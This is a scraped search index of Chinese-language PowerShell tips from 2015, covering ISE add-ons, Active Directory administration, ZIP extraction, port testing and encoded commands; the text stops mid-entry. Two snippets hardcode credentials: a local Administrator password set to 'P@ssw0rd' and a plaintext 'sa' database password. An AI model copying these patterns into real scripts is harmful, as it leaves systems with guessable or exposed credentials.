以下是一个改造，能够在 PowerShell ISE 的“附加工具”菜单中新增一个“List Variables”命令： $code = { $psise.CurrentPowerShellTab.Files | ForEach-Object { $errors = $null [System.Management.Automation.PSParser]::Tokenize($_.Editor.Text, [ref]$errors) | Where-Object { $_.Type -eq 'Variable'} | Select-Object -Property Content | Add-Member -MemberType NoteProperty -Name Script -Value $_.DisplayName -PassThru } | Sort-Object -Property Content, Script -Unique | Out-GridView -Title 'Variables in use' -PassThru } $psise.CurrentPowerShellTab.AddOnsMenu.Submenus.Add('List Variables', $code, 'ALT+V') 当您运行这段代码后，您可以按下 ALT+V 打开一个网格窗口显示所有打开的脚本中用到的变量。","link":"/2015/06/25/adding-quot-list-all-variables-quot-to-powershell-ise/"},{"title":"PowerShell 技能连载 - 获取 Active Directory 用户名","text":"以下是一个在 Active Directory 中快速当前用户并且获取账户信息，例如显示名称的方法： ([adsisearcher]&quot;(samaccountname=$env:USERNAME)&quot;).FindOne().Properties['displayname']","link":"/2015/06/26/getting-active-directory-user-name/"},{"title":"PowerShell 技能连载 - 打开网页","text":"要快速地在 Internet Explorer 中打开新的网页，您可以像这样定义一个名为 Show-WebPage 的新函数： #requires -Version 2 function Show-WebPage { param ( [Parameter(Mandatory = $true, HelpMessage = 'URL to open')] $URL ) Start-Process -FilePath iexplore.exe -ArgumentList $URL } 当您运行这段脚本并执行 Show-WebPage 时，该命令将询问您要打开的 URL。您也可以通过 Show-WebPage 的参数提交 URL。 请注意该函数使用了 Start-Process 命令来启动您指定的浏览器。如果您将这行代码改为： Start-Process -FilePath $URL 那么将会使用您的缺省浏览器来打开该 URL。","link":"/2015/06/29/open-web-page/"},{"title":"PowerShell 技能连载 - 创建“结束进程”应用","text":"只需要通过一个管道命令，PowerShell 就能够打开一个包含正在运行的程序列表。您可以选择列表中的一个或多个进程（按住 CTRL 键选择多余一个条目），然后 PowerShell 可以结束选中的程序。 Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Select-Object -Property Name, Description, MainWindowTitle, Company, ID | Out-GridView -Title 'Choose Application to Kill' -PassThru | Stop-Process -WhatIf 请注意代码中使用了 -WhatIf 来模拟结束进程。如果您希望真的结束进程，那么移除 -WhatIf 代码。 结束程序会导致选中的应用程序立即停止。所有未保存的数据都会丢失。","link":"/2015/06/30/create-task-kill-application/"},{"title":"PowerShell 技能连载 - 创建友好的“结束进程”应用程序","text":"在前一个技能中，我们展示了如何选择应用程序并且立即结束它们。所有未保存的数据将会丢失。 这是一个更复杂的实现。它可以列出所有的应用程序，您可以选择希望结束的应用程序（按住 CTRL 键选择多个应用程序）。 该脚本接下来尝试向选中的应用程序发送“关闭窗口”消息。用户将有机会保存未保存的数据。用户也可以取消“关闭窗口”消息。 This is why the script waits for 15 seconds, and then checks whether the requested applications actually ended. If not, these applications are killed immediately (remove –WhatIf to actually kill them):这是为什么该脚本等待 15 秒，然后确认请求的应用程序是否确实已结束的原因。如果指定的尚未结束，则此时立即结束（移除 -WhatIf 可以真正结束它们）： #requires -Version 3 $list = Get-Process | Where-Object -FilterScript { $_.MainWindowHandle -ne 0 } | Select-Object -Property Name, Description, MainWindowTitle, Company, ID | Out-GridView -Title 'Choose Application to Kill' -PassThru # try and close peacefully $list.ID | ForEach-Object -Process { $process = Get-Process -Id $_ $null = $process.CloseMainWindow() } # give user 15 seconds to respond Start-Sleep -Seconds 15 # check to see if selected programs closed, and if not, kill # them anyway (remove -WhatIf to actually kill them) $list.ID | ForEach-Object -Process { Get-Process -Id $_ -ErrorAction SilentlyContinue } | Where-Object -FilterScript { $_.hasExited -eq $false } | Stop-Process -WhatIf","link":"/2015/07/01/create-benign-task-kill-application/"},{"title":"PowerShell 技能连载 - 将过期的日志存档","text":"有时，你会需要在文件超过一定的日期之后将它们移动到一个存档文件夹。 这个例子演示了如何检测过期文件的基本策略，以及如何将它们移动到存档文件夹： #requires -Version 1 # how old (in days) would obsolete files be $Days = 14 # where to look for obsolete files $Path = $env:windir $Filter = '*.log' # where to move obsolete files $DestinationPath = 'c:\\archive' # make sure destination folder exists $destinationExists = Test-Path -Path $DestinationPath if (!$destinationExists) { $null = New-Item -Path $DestinationPath -ItemType Directory } $cutoffDate = (Get-Date).AddDays(-$Days) Get-ChildItem -Path $Path -Filter $Filter -Recurse -ErrorAction SilentlyContinue | Where-Object -FilterScript { $_.LastWriteTime -lt $cutoffDate } | Move-Item -Destination c:\\archive -WhatIf 这个示例脚本在 Windows 文件夹和它的子文件夹中查找所有扩展名为 *.log 的日志文件。所有超过 14 天（在过去 14 天内没有修改过）的日志文件将被移动到 c:\\archive 目录中。如果该文件夹不存在，则会自动创建。 请注意这只是一个示例脚本。您可能需要管理员权限才能确实将文件移出 Windows 文件夹。","link":"/2015/07/02/moving-outdated-log-files-to-archive/"},{"title":"PowerShell 技能连载 - 加密文本","text":"有很多办法可以加密文本。以下是一个未使用“密钥”的方法，所谓的密钥实际上是您的用户标识符加上机器名。 当您使用 ConvertTo-TextEncrypted 命令加密文本时，结果只能由同一个人在同一台机器上使用 ConvertFrom-TextEncrypted 命令来解密： #requires -Version 2 function ConvertTo-TextEncrypted { param([Parameter(ValueFromPipeline = $true)]$Text) process { $Text | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString } } function ConvertFrom-TextEncrypted { param([Parameter(ValueFromPipeline = $true)]$Text) process { $SecureString = $Text | ConvertTo-SecureString $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString) [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) } } 要测试效果，请先使用这行代码： PS&gt; &quot;Hello World&quot; | ConvertTo-TextEncrypted | ConvertFrom-TextEncrypted Hello World 下一步，得到相同的密文，然后将它保存到一个文件中： $Path = &quot;$env:temp\\secret.txt&quot; 'Hello World' | ConvertTo-TextEncrypted | Set-Content -Path $Path 现在，使用这行代码来读取加密的文件，然后对它进行解密： $Path = &quot;$env:temp\\secret.txt&quot; Get-Content -Path $Path | ConvertFrom-TextEncrypted 请注意两个脚本都不包含密码。而实际的密码正是你的用户标识符。当另一个人，或是您在另一台机器上试图解开文件中的密文，将会失败。 这个方法可以用来安全地保存个人密码，这样您就不用每天都输入了。","link":"/2015/07/03/encrypting-text/"},{"title":"常见的乱码","text":"这是一个程序员段子，实际上是几种常见的乱码： 手持两把锟斤拷， 口中疾呼烫烫烫。 脚踏千朵屯屯屯， 笑看万物锘锘锘。 锟斤拷的来历Unicode和老编码体系的转化过程中，肯定有一些字，用Unicode是没法表示的，Unicode官方用了一个占位符来表示这些文字，这就是：U+FFFD REPLACEMENT CHARACTER。 那么U+FFFD的UTF-8编码出来，恰好是 ‘\\xef\\xbf\\xbd’。如果这个’\\xef\\xbf\\xbd’，重复多次，例如 ‘\\xef\\xbf\\xbd\\xef\\xbf\\xbd’，然后放到GBK/CP936/GB2312/GB18030的环境中显示的话，一个汉字2个字节，最终的结果就是：锟斤拷——锟(0xEFBF)，斤（0xBDEF），拷（0xBFBD） 烫烫烫的来历在windows平台下，ms的编译器（也就是vc带的那个）在 Debug 模式下，会把未初始化的栈内存全部填成 0xcc，用字符串来看就是”烫烫烫烫烫烫烫”，也就是说出现了烫烫烫，赶紧检查初始化吧。。。 屯屯屯的来历同上，未初始化的堆内存全部填成0xcd，字符串看就是“屯屯屯屯屯屯屯屯”。 锘的来历微软在 UTF-8 文件头部加上了 EF BB BF BOM 标记。在不支持 BOM 的环境下对其进行 UTF-8 解码得到“锘”字。","link":"/2015/07/04/Common-Messy-Code/"},{"title":"PowerShell 技能连载 - 设置本地 Administrator 账号的密码","text":"要操作本地用户账号并设置一个新密码，您可以使用底层的 WinNT: 命名空间。 请注意，您需要管理员权限来设置新密码。 这个脚本可以为本地 Administrator 账号设置密码： #requires -Version 1 $Password = 'P@ssw0rd' $admin = [adsi](&quot;WinNT://$env:computername/administrator, user&quot;) $admin.psbase.invoke('SetPassword', $Password)","link":"/2015/07/06/changing-local-administrator-account-password/"},{"title":"PowerShell 技能连载 - AD 操作自动化入门","text":"当 Microsoft 下载的免费的 RSAT 工具包含了 ActiveDirectory 模块。它带有一系列管理 Active Directory 账户的命令。 假设您已经连入了一个 Active Directory 环境，您可以使用以下示例代码来熟悉这些新命令： # find your own user account by SAMAccountName Get-ADUser -Identity $env:USERNAME # find user account by DN Get-ADUser -Identity 'CN=TWeltner,OU=Users,OU=Hannover,OU=Trainees,DC=powershell,DC=local' # find your own user account and return all available attributes Get-ADUser -Identity $env:USERNAME -Properties * # find your own user account and change attributes Get-ADUser -Identity $env:USERNAME | Set-ADUser -Description 'My account' # find all user accounts where the SAMAccount name starts with &quot;T&quot; Get-ADUser -Filter 'SAMAccountName -like &quot;T*&quot;' # find user account &quot;ThomasP&quot; and use different logon details for AD # logon details for your AD $cred = Get-Credential $IPDC = '10.10.11.2' Get-ADUser -Identity ThomasP -Credential $cred -Server $IPDC # find all groups and output results to gridview Get-ADGroup -Filter * | Out-GridView # find all groups below a given search root Get-ADGroup -Filter * -SearchBase 'OU=test,DC=powershell,DC=local' # get all members of a group Get-ADGroupMember -Identity 'Domain Admins' # create new user account named &quot;Tom&quot; # define password $secret = 'Initial$$00' | ConvertTo-SecureString -AsPlainText -Force $secret = Read-Host -Prompt 'Password' -AsSecureString New-ADUser -Name Tom -SamAccountName Tom -ChangePasswordAtLogon $true -AccountPassword $secret -Enabled $true # delete user account &quot;Tom&quot; Remove-ADUser -Identity Tom -Confirm:$false # create an organizational unit named &quot;NewOU1&quot; in powershell.local New-ADOrganizationalUnit -Name 'NewOU1' -Path 'DC=powershell,DC=local' # all user accounts not used within last 180 days $FileTime = (Get-Date).AddDays(-180).ToFileTime() $ageLimit = &quot;(lastLogontimestamp&lt;=$FileTime)&quot; Get-ADUser -LDAPFilter $ageLimit","link":"/2015/07/07/first-steps-automating-ad/"},{"title":"PowerShell 技能连载 - 批量删除 AD 的防意外删除保护","text":"缺省情况下，AD 对象是受保护防止意外删除的。要移除一个指定的范围内所有对象（例如某个机构之下）的这种保护，请试试这段代码： #requires -Version 1 -Modules ActiveDirectory Get-ADObject -Filter * -SearchBase 'OU=TestOU,DC=Vision,DC=local&quot;' | ForEach-Object -Process { Set-ADObject -ProtectedFromAccidentalDeletion $false -Identity $_ } 注意：这段代码需要免费的 RSAT 工具所带的 ActiveDirectory 模块。","link":"/2015/07/08/bulk-remove-protection-for-accidental-deletion-in-ad/"},{"title":"PowerShell 技能连载 - 设置 AD 账号的过期时间","text":"要安全地使用临时的 AD 账号，例如给客户或是顾问使用，请记得设置一个失效日期。 以下示例代码演示了如何设置今天起 20 之后过期： #requires -Version 1 -Modules ActiveDirectory # SAMAccount name $user = 'user12' # days when to expire $Days = 20 # expiration date is today plus the number of days $expirationDate = (Get-Date).AddDays($Days) Set-ADUser -Identity $user -AccountExpirationDate $expirationDate 请注意这段代码需要随 RSAT 免费工具发布的 Active Directory 模块。 如果您的计算机并没有连接到 AD，但是您拥有一个合法的 AD 账号，您可以用这种方法手动连接到 AD： #requires -Version 1 -Modules ActiveDirectory # Name or IP of DC $ServerName = '10.10.12.110' # Logon credentials $Credential = Get-Credential # SAMAccount name $user = 'user12' # days when to expire $Days = 20 # expiration date is today plus the number of days $expirationDate = (Get-Date).AddDays($Days) Set-ADUser -Identity $user -AccountExpirationDate $expirationDate -Server $ServerName -Credential $Credential","link":"/2015/07/09/setting-ad-account-expiration-date/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 的帮助","text":"要查看完整的 PowerShell 帮助，您首先需要从 Internet 下载帮助信息。只需要以管理员权限打开一个 PowerShell 控制台执行以下代码： PS&gt; Start-Process -FilePath powershell.exe -Verb runas 下一步，下载 PowerShell 帮助： PS&gt; Update-Help -UICulture en-us -Force 请注意：PowerShell 帮助只有英语的版本。这是为什么要指定 -UICulture 确保请求下载英文帮助文件的原因。 当帮助文件安装完后，在 PowerShell 4.0 及以上版本就可以使用了。您可以显示一个命令的完整帮助，或只是显示示例代码： PS&gt; Get-Help -Name Get-Random -ShowWindow PS&gt; Get-Help -Name Get-Random -Examples NAME Get-Random SYNOPSIS Gets a random number, or selects objects randomly from a collection. -------------------------- EXAMPLE 1 -------------------------- PS C:\\&gt;Get-Random 3951433 This command gets a random integer between 0 (zero) and Int32.MaxValue. -------------------------- EXAMPLE 2 -------------------------- PS C:\\&gt;Get-Random -Maximum 100 47 This command gets a random integer between 0 (zero) and 99. ... 在 PowerShell 3.0 中，如果您并不是使用英语，您需要手动将帮助文件从 en-US 文件夹复制到您语言对应的文件夹中： #requires -RunAsAdministrator #requires -Version 3 $locale = $host.CurrentUICulture.Name if ($locale -eq 'en-us') { Write-Warning 'You are using the English locale, all is good.' } else { Copy-Item -Path &quot;$pshome\\en-us\\*&quot; -Destination &quot;$pshome\\$locale\\&quot; -Recurse -ErrorAction SilentlyContinue -Verbose Write-Host &quot;Help updated in $locale locale&quot; } 当帮助文件复制到您语言对应的文件夹中后，您就可以在非英语系统中使用英语的帮助文件了。","link":"/2015/07/10/using-powershell-help/"},{"title":"PowerShell 技能连载 - 简单的 AD 组管理","text":"假设您已下载安装了微软免费的 RSAT 工具，那么管理 AD 组合组成员会相当轻松。以下几行代码演示了如何入门： #requires -Version 1 -Modules ActiveDirectory # create new AD group New-ADGroup -DisplayName PowerShellGurus -GroupScope DomainLocal -Name PSGurus # get group Get-ADGroup -Identity PSGurus -Credential $cred -Server 172.16.14.53 # select users by some criteria $newMembers = Get-ADUser -Filter 'Name -like &quot;User*&quot;' # add them to new AD group Add-ADGroupMember -Identity 'PSGurus' -Members $newMembers # list members of group Get-ADGroupMember -Identity PSGurus","link":"/2015/07/13/simple-ad-group-management/"},{"title":"PowerShell 技能连载 - 将命令历史保存到文件","text":"随着 PowerShell 3.0 及以上脚本发布的 PowerShell ISE 内置编辑器可以支持定制，并且可以增加自己的菜单项。 当您运行以下代码时，您会发现在“附加工具”菜单中会多出一个“Get Command History”子菜单，也可以通过 ALT + C 组合键激活该功能。 这个命令将返回当前的命令行历史（您在当前 ISE 会话中交互式键入的命令）并且将它们拷贝到一个新的 PowerShell 文件中。通过这种方式，可以很轻松地保存互操作的历史。您甚至可以通过这种方式自动创建 PowerShell 脚本：只需要删掉不能用的代码行，只留下能产生预期结果的代码行。 #requires -Version 3 $code = { $text = Get-History | Select-Object -ExpandProperty CommandLine | Out-String $file = $psise.CurrentPowerShellTab.Files.Add() $file.Editor.Text = $text } $psise.CurrentPowerShellTab.AddOnsMenu.Submenus.Add('Get Command History', $code, 'ALT+C')","link":"/2015/07/14/get-command-history-as-file/"},{"title":"PowerShell 技能连载 - 复制 Active Directory 安全设置","text":"当您向一个 AD 对象增加委派权限（例如允许一个用户管理一个组织对象的成员）时，实际上是调用了该 AD 对象的改变安全设置方法。 AD 安全描述符有可能非常复杂。复制 AD 安全信息却非常简单。所以如果您希望将相同的安全设置复制到另一个 AD 对象，您可以从一个对象读取已有的安全设置，然后将它们复制到另一个对象上。 这段脚本演示了如何从一个 OU 读取安全设置，并且将它复制到另一个 OU。这需要随 ActiveDirectory 模块发布的 ActiveDirectory 提供器。这个模块是微软免费的 RSAT 工具的一部分，需事先安装。 #requires -Version 2 -Modules ActiveDirectory Import-Module -Name ActiveDirectory # read AD security from NewOU1 $sd = Get-Acl -Path 'AD:\\OU=NewOU1,DC=powershell,DC=local' # assign security to NewOU2 Set-Acl -Path 'AD:\\OU=NewOU2,DC=powershell,DC=local' -AclObject $sd","link":"/2015/07/15/cloning-active-directory-security-settings/"},{"title":"PowerShell 技能连载 - 向 AD 对象增加自定义属性","text":"如果您想向一个 AD 对象增加自定义属性，只需要用一个哈希表，然后增加期望的属性名和属性值。然后用 Set-ADUser（在随微软免费的 RSAT 工具发布的 ActiveDirectory 模块中）。 这个例子将想当前的用户账户增加两个扩展属性（请确保不要破坏基础环境的属性！请使用测试环境来学习）： #requires -Version 1 -Modules ActiveDirectory # create an empty hash table $custom = @{} # add the attribute names and values $custom.ExtensionAttribute3 = 12 $custom.ExtensionAttribute4 = 'Hello' # assign the attributes to your current user object $user = $env:USERNAME Set-ADUser -Identity $user -Add $custom 选择正确的参数很重要。用 -Add 参数向属性增加新的值用 -Remove 移除一个已有的值用 -Replace 将属性替换为一个新的值。","link":"/2015/07/16/adding-custom-attributes-to-ad-objects/"},{"title":"PowerShell 技能连载 - 更新 Active Directory 中的办公电话号码","text":"如果您安装了微软免费提供的 RSAT 工具，您可以使用 PowerShell 来更新您 AD 用户账户中存储的信息，例如您的办公电话号码。 您是否有权限提交变更的信息取决于您的企业安全设置，但缺省情况下您可以修改许多（您自己账户的）信息而不需要管理员权限。 这个例子演示了用 PowerShell 脚本提示输入一个新的办公电话号码然后更新到 Active Directory 中： #requires -Version 1 -Modules ActiveDirectory $phoneNumber = Read-Host -Prompt 'Your new office phone number' $user = $env:USERNAME Set-ADUser -Identity $user -OfficePhone $phoneNumber","link":"/2015/07/17/updating-your-office-phone-number-in-active-directory/"},{"title":"PowerShell 技能连载 - 获取 SQL Server 连接字符串","text":"如果您希望用 PowerShell 访问 SQL Server，您需要一个连接字符串。连接字符串包含了访问 SQL Server 实例所需的所有信息。 通常，要正确地组织一个连接字符串并不容易。以下是一个帮您实现这个目的的 Get-ConnectionString 函数： #requires -Version 2 function Get-ConnectionString { $Path = Join-Path -Path $env:TEMP -ChildPath 'dummy.udl' $null = New-Item -Path $Path -ItemType File -Force $CommandArg = &quot;&quot;&quot;$env:CommonProgramFiles\\System\\OLE DB\\oledb32.dll&quot;&quot;,OpenDSLFile &quot; + $Path Start-Process -FilePath Rundll32.exe -ArgumentList $CommandArg -Wait $ConnectionString = Get-Content -Path $Path | Select-Object -Last 1 $ConnectionString | clip.exe Write-Warning -Message 'Connection String is also available from clipboard' $ConnectionString } 当您运行 Get-ConnectionString 时，PowerShell 会打开一个对话框，您可以提交和测试连接的情况。当您关闭对话框窗口时，PowerShell 将返回由 UI 对话框创建的连接字符串。","link":"/2015/07/20/getting-sql-server-connection-string/"},{"title":"PowerShell 技能连载 - 通过连接字符串访问 SQL 数据库","text":"在前一个技能中我们揭示了如何创建一个 SQL Server 的连接字符串。无论您用什么方式创建了这个字符串——假设您已拥有了一个合法的数据库连接字符串，这个例子将演示如何对数据库执行 SQL 命令。 #requires -Version 2 # make sure this is a valid connection string to your database # see www.connectionstrings.com for reference $connectionString = 'Provider=SQLOLEDB.1;Password=.topSecret!;Persist Security Info=True;User ID=sa;Initial Catalog=test;Data Source=myDBServer\\SQLEXPRESS2012' # make sure this is valid SQL for your database # so in this case, make sure there is a table called &quot;test&quot; $sql = 'select * from test' $db = New-Object -ComObject ADODB.Connection $db.Open($connectionString) $rs = $db.Execute($sql) $results = While ($rs.EOF -eq $false) { $CustomObject = New-Object -TypeName PSObject $rs.Fields | ForEach-Object -Process { $CustomObject | Add-Member -MemberType NoteProperty -Name $_.Name -Value $_.Value } $CustomObject $rs.MoveNext() } $results | Out-GridView","link":"/2015/07/21/accessing-an-sql-database-with-a-connection-string/"},{"title":"PowerShell 技能连载 - 查找物理登录的用户","text":"一台机器上只能有一个物理登录的用户。物理登录的用户意味着正坐在机器旁边的那个用户。 这个 PowerShell 函数能返回本地或远程系统物理登录的用户。要访问远程系统，您可能需要远程系统的本地管理员权限，并且确保防火墙已配置成允许连接。 #requires -Version 1 function Get-LoggedOnUser { param ( $ComputerName, $Credential ) Get-WmiObject -Class Win32_ComputerSystem @PSBoundParameters | Select-Object -ExpandProperty UserName } 运行 Get-LoggedOnUser 命令后能够获得本机上物理登录的用户名。指定 -ComputerName（或者 -Credential）参数可以获得远程机器上物理登录的用户名。","link":"/2015/07/22/find-physically-logged-on-user/"},{"title":"PowerShell 技能连载 - 查找登录的用户","text":"在前一个技能里我们介绍了如何查找物理上登录的用户。在这个技能中您将学习到如何列出当前登录到本地系统的所有用户。这包括了通过 RDP 及其它方式连上的用户： #requires -Version 1 function Get-LoggedOnUserSession { param ( $ComputerName, $Credential ) Get-WmiObject -Class Win32_LogonSession @PSBoundParameters | ForEach-Object { $_.GetRelated('Win32_UserAccount') | Select-Object -ExpandProperty Caption } | Sort-Object -Unique } 执行 Get-LoggedOnUserSession 命令将得到当前登录到机器上的所有用户。如指定了 -Credential（域名\\用户名）参数，可以访问远程机器。","link":"/2015/07/23/finding-logged-on-users/"},{"title":"PowerShell 技能连载 - 测试一个网络端口","text":"这个 Test-Port 的测试函数可以通过一个网络端口测试一台远程的机器。它传入一个远程机器名（或 IP 地址），以及可选的端口号和和超时值。 缺省端口号是 5985，改端口用于 PowerShell 远程操作。缺省的超时值是 1000ms（1 秒）。 #requires -Version 1 function Test-Port { Param([string]$ComputerName,$port = 5985,$timeout = 1000) try { $tcpclient = New-Object -TypeName system.Net.Sockets.TcpClient $iar = $tcpclient.BeginConnect($ComputerName,$port,$null,$null) $wait = $iar.AsyncWaitHandle.WaitOne($timeout,$false) if(!$wait) { $tcpclient.Close() return $false } else { # Close the connection and report the error if there is one $null = $tcpclient.EndConnect($iar) $tcpclient.Close() return $true } } catch { $false } } 所以如果您希望知道一台远程计算机是否启用了 PowerShell 远程操作，您只需要运行： PS&gt; Test-Port -ComputerName TestServer False 由于缺省的超时值是 1 秒，您最多等待 1 秒就能等到响应。","link":"/2015/07/24/testing-a-network-port/"},{"title":"PowerShell 技能连载 - 查找打开了 PowerShell 远程操作功能的计算机","text":"在前一个技能中我们演示了如何如何测试一台计算机的端口。在安装了 Microsoft 免费的 RSAT 工具之后，您可以查询您的 Active Directory，并获取所有计算机用户的列表，或指定范围内的所有计算机账户（例如用 -SearchBase 限制在一个特定的 OU 中搜索）。 下一步，您可以使用该端口来测试这些计算机是否在线，以及 PowerShell 远程操作端口 5985 是否打开： #requires -Version 1 -Modules ActiveDirectory function Test-Port { Param([string]$ComputerName,$port = 5985,$timeout = 1000) try { $tcpclient = New-Object -TypeName system.Net.Sockets.TcpClient $iar = $tcpclient.BeginConnect($ComputerName,$port,$null,$null) $wait = $iar.AsyncWaitHandle.WaitOne($timeout,$false) if(!$wait) { $tcpclient.Close() return $false } else { # Close the connection and report the error if there is one $null = $tcpclient.EndConnect($iar) $tcpclient.Close() return $true } } catch { $false } } Get-ADComputer -Filter * | Select-Object -ExpandProperty dnsHostName | ForEach-Object { Write-Progress -Activity 'Testing Port' -Status $_ } | Where-Object -FilterScript { Test-Port -ComputerName $_ }","link":"/2015/07/27/finding-computers-with-powershell-remoting/"},{"title":"PowerShell 技能连载 - 解压 ZIP 文件","text":"在 PowerShell 5.0 中，有一个新的 cmdlet 可以解压 ZIP 文件： #requires -Version 5 $Source = 'C:\\somezipfile.zip' $Destination = 'C:\\somefolder' $Overwrite = $true $ShowDestinationFolder = $true Expand-Archive -Path $Source -DestinationPath $Destination -Force:$Overwrite if ($ShowDestinationFolder) { explorer.exe $Destination }","link":"/2015/07/28/unzipping-zip-files/"},{"title":"PowerShell 技能连载 - 在 PowerShell 3.0 和 4.0 中解压 ZIP 文件","text":"PowerShell 5.0 中引入了 ZIP 文件支持，但是如果您安装了 .NET Framework 4.5 并且希望更多地控制解压的过程，请试试这个方法： #requires -Version 2 # .NET Framework 4.5 required! Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop $Source = 'C:\\somezipfile.zip' $Destination = 'C:\\somefolder' $Overwrite = $true $ShowDestinationFolder = $true if ((Test-Path $Destination) -eq $false) { $null = mkdir $Destination } $Content = [IO.Compression.ZipFile]::OpenRead($Source).Entries $Content | ForEach-Object -Process { $FilePath = Join-Path -Path $Destination -ChildPath $_ [IO.Compression.ZipFileExtensions]::ExtractToFile($_,$FilePath,$Overwrite) } if ($ShowDestinationFolder) { explorer.exe $Destination }","link":"/2015/07/29/unzipping-zip-files-with-powershell-3-0-and-4-0/"},{"title":"PowerShell 技能连载 - 在任意 Powershell 版本中解压 ZIP 文件","text":"如果您没有安装 PowerShell 5.0，并且没有安装 .NET Framework 4.5，以下是一个使用 Windows 原生功能解压 ZIP 文件的办法。 不过，如果您安装了资源管理器自定义的 ZIP 文件扩展，这个方法可能不能用。 $Source = 'C:\\somezipfile.zip' $Destination = 'C:\\somefolder' $ShowDestinationFolder = $true if ((Test-Path $Destination) -eq $false) { $null = mkdir $Destination } $shell = New-Object -ComObject Shell.Application $sourceFolder = $shell.NameSpace($Source) $destinationFolder = $shell.NameSpace($Destination) $DestinationFolder.CopyHere($sourceFolder.Items()) if ($ShowDestinationFolder) { explorer.exe $Destination } 这个方法的好处是在需要覆盖文件的时候，会弹出 shell 的对话框。这个方法也可以解压 CAB 文件。","link":"/2015/07/30/unzipping-zip-files-with-any-powershell-version/"},{"title":"PowerShell 技能连载 - 改变 ISE 缩放比例","text":"PowerShell ISE 的右下角有一个缩放滑竿，您也可以用 PowerShell 代码来控制它。 所以，您可以在 $profile 脚本中设置缺省值： $psise.Options.Zoom = 120 或者，可以写一些代码来戏弄您的同事： #requires -Version 2 $zoom = $psise.Options.Zoom # slide in for ($i = 20; $i -lt 200; $i++) { $psise.Options.Zoom = $i } # slide out for ($i = 199; $i -gt 20; $i--) { $psise.Options.Zoom = $i } # random whacky 1..10 | ForEach-Object { $psise.Options.Zoom = (Get-Random -Minimum 30 -Maximum 400) Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 400) } $psise.Options.Zoom = $zoom","link":"/2015/07/31/change-ise-zoom-level/"},{"title":"PowerShell 技能连载 - 查找带动态参数的 cmdlet","text":"有些 cmdlet 暴露了动态参数。它们只在特定的环境下可用。例如 Get-ChildItem 只在当前的位置是文件系统路径（并且是 PowerShell 3.0 以上版本）时才暴露 -File 和 -Directory 参数。 要查找所有带动态参数的 cmdlet，请试试这段代码： #requires -Version 2 $cmdlets = Get-Command -CommandType Cmdlet $cmdlets.Count $loaded = $cmdlets | Where-Object { $_.ImplementingType } $loaded.Count $dynamic = $loaded | Where-Object { $cmdlet = New-Object -TypeName $_.ImplementingType.FullName $cmdlet -is [System.Management.Automation.IDynamicParameters] } $dynamic.Count $dynamic | Out-GridView 您将只会获得已加载并且包含动态参数的 cmdlet。","link":"/2015/08/03/finding-cmdlets-with-dynamic-parameters/"},{"title":"PowerShell 技能连载 - 发现动态参数","text":"在前一个技能中我们展示了如何查找暴露了动态参数的 cmdlet。现在让我们来探索什么事动态参数。这个 Get-CmdletDynamicParameter 函数将返回一个动态参数的列表和它们的缺省值： #requires -Version 2 function Get-CmdletDynamicParameter { param ( [Parameter(ValueFromPipeline = $true,Mandatory = $true)] [String] $CmdletName ) process { $command = Get-Command -Name $CmdletName -CommandType Cmdlet if ($command) { $cmdlet = New-Object -TypeName $command.ImplementingType.FullName if ($cmdlet -is [Management.Automation.IDynamicParameters]) { $flags = [Reflection.BindingFlags]'Instance, Nonpublic' $field = $ExecutionContext.GetType().GetField('_context', $flags) $context = $field.GetValue($ExecutionContext) $property = [Management.Automation.Cmdlet].GetProperty('Context', $flags) $property.SetValue($cmdlet, $context, $null) $cmdlet.GetDynamicParameters() } } } } Get-CmdletDynamicParameter -CmdletName Get-ChildItem 该函数使用一些黑客的办法来暴露动态参数，这种方法是受到 Dave Wyatt 的启发。请参见他的文章 https://davewyatt.wordpress.com/2014/09/01/proxy-functions-for-cmdlets-with-dynamic-parameters/。","link":"/2015/08/04/discovering-dynamic-parameters/"},{"title":"PowerShell 技能连载 - 当前脚本的路径","text":"在 PowerShell 1.0 和 2.0 中，您需要一堆奇怪的代码来获得当前脚本的位置： # make sure the script is saved and NOT &quot;Untitled&quot;! $invocation = (Get-Variable MyInvocation).Value $scriptPath = Split-Path $invocation.MyCommand.Path $scriptName = $invocation.MyCommand.Name $scriptPath $scriptName 只有将它放在脚本的根部，这段代码才能用。 从 PowerShell 3.0 开始，事情变得更简单了，并且这些特殊变量在您脚本的任意地方都可以用。 # make sure the script is saved and NOT &quot;Untitled&quot;! $ScriptName = Split-Path $PSCommandPath -Leaf $PSScriptRoot $PSCommandPath $ScriptName","link":"/2015/08/05/current-script-path/"},{"title":"PowerShell 技能连载 - 定义多行文本","text":"当您需要在 PowerShell 中定义多行文本时，通常可以这样使用 here-string： $text = @&quot; I am safe here I can even use &quot;quotes&quot; &quot;@ $text | Out-GridView 值得注意的重点是分隔符包含（不可见的）回车符。必须在开始标记后有一个，在结束标记前有一个。 一个很特殊的另一种用法是使用脚本块来代替： $text = { I am safe here I can even use &quot;quotes&quot; } $text.ToString() | Out-GridView 虽然代码颜色不同，并且需要将脚本块转为字符串。这种方法有一定局限性，因为脚本块是一段 PowerShell 代码，并且它会被解析器解析。所以您只能包裹一段不会造成解析器混淆的文本。 这个是个不合法的例子，将会造成语法错误，因为非闭合的双引号： $text = { I am safe here I can even use &quot;quotes } $text.ToString() | Out-GridView","link":"/2015/08/06/define-multiline-text/"},{"title":"PowerShell 技能连载 - 解码 PowerShell 命令","text":"当您需要在一个独立的 powershell.exe 以一个 PowerShell 命令的方式执行代码时，并不十分安全。这要看您从哪儿调用 powershell.exe，您的代码参数可能被解析器修改，而且代码中的特殊字符可能会造成宿主混淆。 一个更健壮的传递命令方法是将它们编码并用解码命令提交。这只适用于短的代码。长度必须限制在 8000 字符左右以内。 $code = { Get-EventLog -LogName System -EntryType Error | Out-GridView } $Bytes = [System.Text.Encoding]::Unicode.GetBytes($code.ToString()) $Encoded = [Convert]::ToBase64String($Bytes) $args = '-noprofile -encodedcommand ' + $Encoded Start-Process -FilePath powershell.exe -ArgumentList $args","link":"/2015/08/07/encode-powershell-commands/"},{"title":"PowerShell 技能连载 - 避免使用重定向符","text":"如果您还在使用旧的重定向操作符来将命令的结果输出到一个文件，那么您可以使用新的 PowerShell cmdlet 来代替。以下是原因： #requires -Version 2 $OutPath = &quot;$env:temp\\report.txt&quot; Get-EventLog -LogName System -EntryType Error, Warning 